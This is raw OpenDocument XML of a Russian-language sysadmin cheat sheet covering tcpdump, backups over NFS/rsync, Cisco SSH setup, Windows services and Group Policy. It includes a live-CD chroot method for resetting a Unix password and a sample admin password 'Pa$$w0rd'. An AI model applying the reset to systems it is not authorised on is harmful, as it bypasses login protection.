      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tcpdump -vvv -s 0 -l -n port 53 # </text:span><text:span text:style-name="T3">показываем</text:span><text:span text:style-name="T2"> DNS </text:span><text:span text:style-name="T3">трафик</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tcpdump -nl -i bge0 not port ssh and src \(192.168.16.121 or 192.168.16.54\)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">tcpdump -n -i eth1 net 192.168.16.121 # Выборка входящий/исходящий по одному IP адресу</text:p>
      <text:p text:style-name="P1">tcpdump -n -i eth1 net 192.168.16.0/24 # Выборка входящий/исходящий по адресу сети</text:p>
      <text:p text:style-name="P5">tcpdump -l &gt; dump &amp;&amp; tail -f dump # Вывод через буфер</text:p>
      <text:p text:style-name="P5">tcpdump -i rl0 -w traffic.rl0 # Писать заголовки в бинарный файл</text:p>
      <text:p text:style-name="P1">tcpdump -i rl0 -s 0 -w traffic.rl0 # Писать в бинарный фйл полные пакеты</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">tcpdump -r traffic.rl0 # Прочитать из файла (так-же для ethereal</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">tcpdump -i eth0 -s 0 -A port 80 | grep GET <text:s text:c="5"/># -s 0 </text:span><text:span text:style-name="T3">для</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">полных</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">пакетов</text:span><text:span text:style-name="T2">, -A </text:span><text:span text:style-name="T3">для</text:span><text:span text:style-name="T2"> ASCII</text:span></text:p>
      <text:p text:style-name="P1">Где искать вредоносный код в linux</text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">var</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">at</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">tabs</text:span><text:span text:style-name="T3">/&lt;</text:span><text:span text:style-name="T2">username</text:span><text:span text:style-name="T3">&gt; /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">ttys</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">pro</text:span><text:span text:style-name="T3">ﬁ</text:span><text:span text:style-name="T2">le</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">bashrc</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">csh</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">cshrc</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">csh</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">login</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">rc</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">common</text:span><text:span text:style-name="T3"> ~/.</text:span><text:span text:style-name="T2">pro</text:span><text:span text:style-name="T3">ﬁ</text:span><text:span text:style-name="T2">le</text:span><text:span text:style-name="T3"> ~/.</text:span><text:span text:style-name="T2">bashrc</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">home</text:span><text:span text:style-name="T3">/&lt;</text:span><text:span text:style-name="T2">username</text:span><text:span text:style-name="T3">&gt;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Сброс</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">пароля</text:span><text:span text:style-name="T2"> Reset Password Unix, FreeBSD, Linux, Debian, ASP linux</text:span></text:p>
      <text:p text:style-name="P1">Основой способ для любых unix:</text:p>
      <text:p text:style-name="P1">!!! получится если системный раздел не зашифрован</text:p>
      <text:p text:style-name="P1">0. Загружаемся с livecd </text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Например</text:span><text:span text:style-name="T2">: debian live cd, ubuntu live, <text:s/>systemrescue </text:span><text:span text:style-name="T3">и</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">т</text:span><text:span text:style-name="T2">.</text:span><text:span text:style-name="T3">д</text:span><text:span text:style-name="T2">.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">https://www.system-rescue.org/</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">1. После загрузки определяемся с дисками</text:p>
      <text:p text:style-name="P1">fdisk -l </text:p>
      <text:p text:style-name="P1">lsblk</text:p>
      <text:p text:style-name="P1">2. Монтируем раздел системы</text:p>
      <text:p text:style-name="P1">mount /dev/sda1 /mnt</text:p>
      <text:p text:style-name="P1">3. Выполняем смену корня</text:p>
      <text:p text:style-name="P1">chroot /mnt</text:p>
      <text:p text:style-name="P1">4. Выполняем смену пароля</text:p>
      <text:p text:style-name="P1">passwd user</text:p>
      <text:p text:style-name="P1">5. Выходим chroot и загружаемся в систему</text:p>
      <text:p text:style-name="P1">Ctrl+d</text:p>
      <text:p text:style-name="P1">reboot</text:p>
      <text:p text:style-name="P1">Больше способов https://bookflow.ru/sbros-parolya-reset-password-unix-freebsd-linux-debian-asp-linux/</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Запрет</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">запуска</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">приложения</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">через</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">реестр</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Windows Registry Editor Version 5.00 [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">“DisallowRun”=dword:00000001</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">“1″=”программа.exe”</text:p>
      <text:p text:style-name="P7">“2″=”другая_программа.exe”</text:p>
      <text:p text:style-name="P1">GPO Запрет запуска приложения через gpedit</text:p>
      <text:p text:style-name="P1">Пользовательские настройки -&gt; Административные шаблоны -&gt; Система</text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T3">Чтобы ограничить определенные программы, выберите команду "Запускать только указанные программы Windows". Чтобы заблокировать </text:span><text:soft-page-break/><text:span text:style-name="T3">определенные программы, выберите команду "Не запускать указанные программы Windows". Удалить все текущие настройки локальных групповых политик необходимо удалить файлы Registry.pol в каталоге GroupPolicy.</text:span></text:p>
      <text:p text:style-name="P5">Сделать это можно следующими командами, запущенными в командной строке с правами администратора:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">RD /S /Q "%WinDir%\System32\GroupPolicyUsers" </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">RD /S /Q "%WinDir%\System32\GroupPolicy" </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">gpupdate /force</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Как</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">найти</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">дублирующийся</text:span><text:span text:style-name="T2"> SID </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">домене</text:span><text:span text:style-name="T2"> Active Directory</text:span></text:p>
      <text:p text:style-name="P1">0. Ntdsutil - запускаем программу на DC</text:p>
      <text:p text:style-name="P1">1. В ней выполняем: </text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">security account management - </text:span><text:span text:style-name="T3">нажимаем</text:span><text:span text:style-name="T2"> Enter</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">connect to server </text:span><text:span text:style-name="T3">ИМЯ</text:span><text:span text:style-name="T2">_</text:span><text:span text:style-name="T3">СЕРВЕРА</text:span><text:span text:style-name="T2">_</text:span><text:span text:style-name="T3">КОНТРОЛЛЕРА</text:span><text:span text:style-name="T2">_</text:span><text:span text:style-name="T3">ДОМЕНА</text:span><text:span text:style-name="T2"> - </text:span><text:span text:style-name="T3">вновь</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">нажимаем</text:span><text:span text:style-name="T2"> Enter.</text:span></text:p>
      <text:p text:style-name="P1">check duplicate sid - в очередной раз нажимаем Enter. </text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3">2. После этого в текстовом окне программы выведутся дублирующийся SID'ы, а так же все будет записано в логфайл dupsid.log, который по умолчанию запишется в директорию </text:span><text:span text:style-name="T2">C:\Windows\system32.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">NFS \ Rsync \ Backup</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">NFS </text:span><text:span text:style-name="T3">сервер</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сервер</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">ставим</text:span><text:span text:style-name="T2"> apt-get install nfs-kernel-server nfs-common portmap</text:span></text:p>
      <text:p text:style-name="P1">/usr/allbackup тут все будут бэкапы</text:p>
      <text:p text:style-name="P1">nano /etc/exports тут ставим какие нужны каталоги</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">/usr/allbackup/name_catalog ip_clienta(rw,sync,no_root_squash,no_subtree_check)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">применить команду exportfs -a</text:p>
      <text:p text:style-name="P1">NFS на клиенте:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">apt-get install nfs-common portmap rsync</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mkdir /nfs/name_catalog -p</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">nano /etc/fstab</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">ip_server:/usr/allbackup/name_catalog /nfs/name_catalog nfs rw,sync,hard,intr 0 0</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Создаем каталоги для бэкапа:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mkdir -p /root/backup/{www,etc,sql}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Скрипт для бэкапа:</text:p>
      <text:p text:style-name="P1">touch /root/backupwww</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#!/bin/bash</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#[Changes Directory]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cd /root/backup</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#[Stamps the file name with a date]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">TIMESTAMP=date +%m-%d-%y-%H%M</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#[DB Backup Scripts]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2"># DB Name</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">HOST=localhost</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">DBNAME="basename"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">USER="username"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">PASSWORD="password"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T1"><text:span text:style-name="T2">DUMP_PATH=/root/backup/sql</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T1"><text:span text:style-name="T2">BACK_PATH=/root/backup/www</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">BACK_PATH3=/root/backup/etc</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#dbname</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mysqldump --opt -c -e -Q -h$HOST -u$USER -p$PASSWORD $DBNAME &gt; $DBNAME.sql</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tar czpf $DUMP_PATH/$DBNAME.$TIMESTAMP.tar.gz $DBNAME.sql</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">rm -f $DBNAME.sql</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#Backing up files</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tar cvzpf $BACK_PATH/www.$TIMESTAMP.tar.gz --same-owner <text:s/>--exclude=/var/www/site/gruzims/* /var/www</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">tar cvzpf $BACK_PATH3/etc.$TIMESTAMP.tar.gz /etc</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">C</text:span><text:span text:style-name="T3">крипт</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">стиралки</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">touch /root/delbackup</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#!/bin/bash</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cd /var/backup/</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">find /var/backup/mysql -name "*.tar.gz" -mtime +30 |xargs /bin/rm -f {};</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">find /var/backup/www -name "*.tar.gz" -mtime +30 |xargs /bin/rm -f {};</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Настройка</text:span><text:span text:style-name="T2"> crontab:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">crontab -e </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">0 5 * * * /usr/bin/rsync -a /root/ /nfs/folder </text:span><text:span text:style-name="T3">синхронизируем</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">бэкапы</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сервер</text:span><text:span text:style-name="T2"> nfs</text:span></text:p>
      <text:p text:style-name="P7">0 2 * * * /root/backupwww скрипт бэкапа</text:p>
      <text:p text:style-name="P1">Как настроить SSH на Cisco</text:p>
      <text:p text:style-name="P1">Заходим в привилегированный режим;</text:p>
      <text:p text:style-name="P1">cisco&gt;enable</text:p>
      <text:p text:style-name="P1">Устанавливаем дату и время (нужны для генерации ключа);</text:p>
      <text:p text:style-name="P5">cisco#clock set 09:02:13 27 Apr 2022</text:p>
      <text:p text:style-name="P5">Входим в режим конфигурирования;</text:p>
      <text:p text:style-name="P1">cisco#conf t</text:p>
      <text:p text:style-name="P1">Указываем домен и имя устройства (для генерации ключа);</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco(config)#ip domain name domain.local</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco(config)#hostname cisco-ssh</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Генерируем</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">ключ</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">для</text:span><text:span text:style-name="T2"> SSH;</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco-ssh(config)#crypto key generate rsa</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Храним пароли в зашифрованном виде;</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco-ssh(config)#service password-encryption</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Создаем пользователя admin с паролем Pa$$w0rd и максимальными привилегиями;</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco-ssh(config)#username admin privilege 15 secret Pa$$w0rd</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Задаем пароль для привилегированного режима;</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco-ssh(config)#enable secret Pa$$w0rd</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Активируем</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">протокол</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">ААА</text:span><text:span text:style-name="T2">;</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco-ssh(config)#aaa new-model</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Разрешаем компьютерам внутренней сети заходить на Cisco по SSH;</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco-ssh(config)#access-list 23 permit 192.168.0.0 0.0.0.255</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Входим в режим конфигурирования терминальный линий;</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco-ssh(config)#line vty 0 4</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Запрещаем</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">все</text:span><text:span text:style-name="T2">, </text:span><text:span text:style-name="T3">кроме</text:span><text:span text:style-name="T2"> SSH;</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco-ssh(config-line)#transport input ssh</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Активируем автоматическое поднятие строки после ответа системы на проделанные изменения;</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco-ssh(config-line)#logging synchronous</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Позволяем входить сразу в привилигированный режим;</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco-ssh(config-line)#privilege level 15</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Настраиваем автоматическое закрытие SSH сессии через 60 минут;</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco-ssh(config-line)#exec-timeout 60 0</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Привязываем группу доступа, созданную на шаге 10, к терминальной линии;</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco-ssh(config-line)#access-class 23 in</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Выходим из настроек и сохраняем конфигурацию.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco(config-line)exit</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco(config)exit</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco#copy run start</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Службы</text:span><text:span text:style-name="T2">/</text:span><text:span text:style-name="T3">Сервисы</text:span></text:p>
      <text:p text:style-name="P1">Управление службами:</text:p>
      <text:p text:style-name="P1">sc getkeyname "ХХХХХ" - получишь ид сервиса</text:p>
      <text:p text:style-name="P1">sc queryex "ХХХХХ" - узнаешь по ид все о сервисе</text:p>
      <text:p text:style-name="P1">0) Основным инструментом для управления службами в графическом режиме является консоль services.msc </text:p>
      <text:p text:style-name="P1">- <text:s/>«Пуск» -&gt; «Панель управления» -&gt; «Администрирование»</text:p>
      <text:p text:style-name="P1">1) Управление службами из командной строки с помощью утилиты net.exe</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">net start service_name</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T1"><text:span text:style-name="T2">net stop service_name</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T1"><text:span text:style-name="T3">2) </text:span><text:span text:style-name="T2">sc</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">exe</text:span></text:p>
      <text:p text:style-name="P1">sc.exe stop DNSCache - остановить службу DNSCache на локальном компьютере</text:p>
      <text:p text:style-name="P1">sc \\SERVER_NAME query DNSCache - опросить состояние службы DNSCache на компьютере SERVER_NAME</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">sc \\SERVER_NAME start DNSCache - </text:span><text:span text:style-name="T3">запустить</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">службу</text:span><text:span text:style-name="T2"> DNSCache </text:span><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">компьютере</text:span><text:span text:style-name="T2"> SERVER_NAME</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">sc config "service name" start= "</text:span><text:span text:style-name="T3">параметры</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">запуска</text:span><text:span text:style-name="T2">"</text:span></text:p>
      <text:p text:style-name="P1"># параметры запуска:</text:p>
      <text:p text:style-name="P1"># auto (автоматически)</text:p>
      <text:p text:style-name="P1"># demand (вручную)</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># disabled (</text:span><text:span text:style-name="T3">отключена</text:span><text:span text:style-name="T2">)</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">sc [Servername] create Servicename [Optionname= Optionvalue... - </text:span><text:span text:style-name="T3">создание</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">службы</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">sc delete "name_service" - </text:span><text:span text:style-name="T3">удаление</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">службы</text:span><text:span text:style-name="T2"> (!!!)</text:span></text:p>
      <text:p text:style-name="P1">Основные службы windows:</text:p>
      <text:p text:style-name="P1">w32time - служба времени</text:p>
      <text:p text:style-name="P1">csrss.exe - Client Server Runtime Process - важный компонент, он обрабатывает пользовательский режим блока подсистемы Win32. (обычная мишень для вирусов)</text:p>
      <text:p text:style-name="P1">explorer.exe - Проводник, Рабочий стол и меню Пуск. Если в этой программе происходят сбои, то Windows обычно автоматически снова запускает ее.</text:p>
      <text:p text:style-name="P1">lsass.exe - подсистема несет ответственность за аутентификацию пользователей в вашей системе</text:p>
      <text:p text:style-name="P1">rundll32.exe - программа, запуск функции в Динамически подключаемой библиотек, является загрузчиком для других программ</text:p>
      <text:p text:style-name="P1">services.exe - запускает службы, которые являются автономными процессами</text:p>
      <text:p text:style-name="P1">smss.exe - важный компонент Windows (еще он запускает из ветки реестра HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session)</text:p>
      <text:p text:style-name="P1">spoolsv.exe - (известная как spooler) программа занимается процессами печати и организации очередей печати </text:p>
      <text:p text:style-name="P1">svchost.exe - приложение несет ответственность за запуск большинства служб</text:p>
      <text:p text:style-name="P1">System - системный процесс (ntoskrnl.ехе), основной компонент Windows</text:p>
      <text:p text:style-name="P1">System Idle Process - «незанятый» процесс - 16-килобайтный цикл, используемый, чтобы занять не используемые все циклы центрального процессора</text:p>
      <text:p text:style-name="P1">winlogon.exe - управляет действиями пользователя, связанными с безопасностью (запрос входа/выхода из системы, раз/блокировка компьютера, изменение пароля, реестр)</text:p>
      <text:p text:style-name="P1">wmlprvse.exe - поддержка инструментальных средств управления средой Windows (WMI), также известен как Управление предприятием на основе веб-технологий (WBEM)</text:p>
      <text:p text:style-name="P1">Один экземпляр svchost.exe отвечает за одну или несколько служб. Никогда не вмешивайтесь в копии svchost.exe или services.exe, которые вы увидите в списке Диспетчера задач. Службы которые можно отключить для повышение производительности домашнего ПК c windows 10:</text:p>
      <text:p text:style-name="P5">Dmwappushservice - служба маршрутизации пуш-сообщений WAP, один из так называемых элементов слежки Microsoft.</text:p>
      <text:p text:style-name="P8"><text:soft-page-break/><text:span text:style-name="T3">NVIDIA Stereoscopic 3D Driver Service - если на своем ПК или ноутбуке с графическим адаптером от NVIDIA вы не смотрите стереоскопическое 3D-видео, данную службу можно смело отключить.</text:span></text:p>
      <text:p text:style-name="P1">Superfetch - может быть отключена, если в качестве системного диска используется SSD.</text:p>
      <text:p text:style-name="P1">Биометрическая служба Windows - отвечает за сбор, сравнение, обработку и хранение биометрических данных о пользователе и приложениях. Работает только на устройствах со сканерами отпечатка пальца и прочими биометрическими датчиками, поэтому на остальных может быть отключена.</text:p>
      <text:p text:style-name="P1">Браузер компьютеров - можно отключить, если ваш ПК или ноутбук является единственным устройством в сети, то есть не подключен к домашней сети и/или другим компьютерам.</text:p>
      <text:p text:style-name="P1">Вторичный вход в систему - если вы являетесь единственным пользователем в системе и в ней нет других учетных записей, эта служба может быть отключена.</text:p>
      <text:p text:style-name="P1">Диспетчер печати - отключать стоит исключительно в том случае, если вы не пользуетесь не только физическим принтером, но и виртуальным, то есть не экспортируете электронные документы в формат PDF.</text:p>
      <text:p text:style-name="P1">Общий доступ к подключению к Интернету (ICS) - если вы не раздаете со своего ПК или ноутбука Wi-Fi, и к нему не требуется подключаться с других устройств для обмена данными, службу можно отключить.</text:p>
      <text:p text:style-name="P1">Рабочие папки - предоставляет возможность настройки доступа к данным внутри корпоративной сети. Если вы в таковую не входите, можно отключать.</text:p>
      <text:p text:style-name="P1">Сетевая служба Xbox Live - если не играете на Xbox и в Windows-версии игр для этой консоли, службу можно отключить.</text:p>
      <text:p text:style-name="P1">Служба виртуализации удаленных рабочих столов Hyper-V - это виртуальная машина, интегрированная в корпоративные версии Windows. Если вы таковой не пользуетесь, можете смело деактивировать как конкретно эту службу, так и указанные ниже, напротив которых мы установили пометку «Hyper-V» или это обозначение есть в их названии.</text:p>
      <text:p text:style-name="P1">Служба географического положения - название говорит само за себя, с помощью этой службы система отслеживает ваше местоположение. Если считаете ее ненужной, можете отключать, но помните, что после этого даже стандартное приложение «Погода» будет работать некорректно.</text:p>
      <text:p text:style-name="P1">Служба данных датчиков - отвечает за обработку и хранение сведений, получаемых системой с установленных в компьютере датчиков. По сути, это банальная статистика, не представляющая интереса для рядового пользователя.</text:p>
      <text:p text:style-name="P1">Служба датчиков - аналогично предыдущему пункту, может быть отключена.</text:p>
      <text:p text:style-name="P1">Служба завершения работы в качестве гостя - Hyper-V.</text:p>
